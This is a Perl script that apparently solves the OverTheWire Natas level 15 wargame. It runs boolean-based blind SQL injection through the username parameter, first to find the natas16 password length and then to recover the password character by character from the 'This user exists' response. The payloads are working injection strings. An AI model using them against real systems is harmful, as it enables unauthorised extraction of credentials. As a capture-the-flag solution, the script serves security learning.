#!/bin/perl
use LWP::Simple;
use HTML::Parse;
use URI;
use v5.10;

my $user = 'natas15';
my $login = shift or die "Please provide the password as argument\n";
my $host = $user.'.natas.labs.overthewire.org';
my $uri = URI->new(sprintf("http://%s:%s@%s", $user, $login, $host));

# Doing boolean-based SQL injection
# Password length
sub check_length() {
  # Disable buffering for carriage return to print in STDOUT
  local $|=1;
  my $injection = 'natas16" AND length(password)=%d -- ';

  for( $i = 1; $i < 40; $i++ ){
    printf ("\rDetermining password length: %2d", $i);
    $uri->query_form( debug => 1, username => sprintf($injection, $i) );
    my $result = parse_html( get($uri) ) ->format;
    if ($result =~ /This user exists/) {
      return $i;
    }
  }

  die "Couldn't determine password length";
}
my $length = check_length();
say "\rThe password length for nata16 is $length";

# Password
my $password = '';
my @chars = (a..z, A..Z, 0..9);
sub determine_password {
  # Disable buffering for carriage return to print in STDOUT
  local $|=1;
  # We use binary for the string so the comparison is case sensitive
  my $injection = 'natas16" AND STRCMP(BINARY SUBSTR(password, 1, %d), BINARY "%s") = 0 -- ';
  # Check all possible characters
  foreach my $ch (@chars) {
    print "\rDetermining password: $password$ch";
    $uri->query_form( debug => 1, username => sprintf($injection, $_[0], $password . $ch) );
    my $result = parse_html( get( $uri ) )->format;
    if ($result =~ /This user exists/) {
      return $ch;
    }
  }
  die "Couldn't determine password";
}
for( $idx=1; $idx <= $length; $idx++ ) {
  $password .= determine_password($idx);
}
say "\rThe password for natas16 is $password";
